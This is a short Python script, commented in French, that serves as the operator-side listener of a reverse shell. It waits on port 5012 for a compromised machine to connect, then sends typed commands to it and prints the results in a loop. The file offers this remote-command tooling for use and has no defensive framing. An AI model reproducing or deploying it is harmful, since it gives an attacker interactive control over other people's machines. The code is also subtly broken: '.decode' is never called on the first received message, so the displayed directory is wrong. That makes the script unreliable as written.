import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5012
BUFFER_SIZE = 1024 * 128  #size message

SEPARATOR = "<sep>"

s = socket.socket()

s.bind((SERVER_HOST,SERVER_PORT))

# on ouvre l'écoute d'un potentiel client
s.listen(5)
print(f"[-] Listening as {SERVER_HOST}:{SERVER_PORT} ... On Waiting .... ")

# si connexion client on accepte
client_socket, client_address = s.accept()
print(f"[!] {client_address[0]}{client_address[1]} IS NOW CONNECTEC !!! ")

# recevoir le dossier actuel
cwd = client_socket.recv(BUFFER_SIZE).decode
print("[+] Current directory :", cwd)

# boucle d'écriture des actions
while True :
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    
    client_socket.send(command.encode())
    if command.lower() == "quit":
        break
    
    output = client_socket.recv(BUFFER_SIZE).decode()

    results, cwd = output.split(SEPARATOR)

    print (results)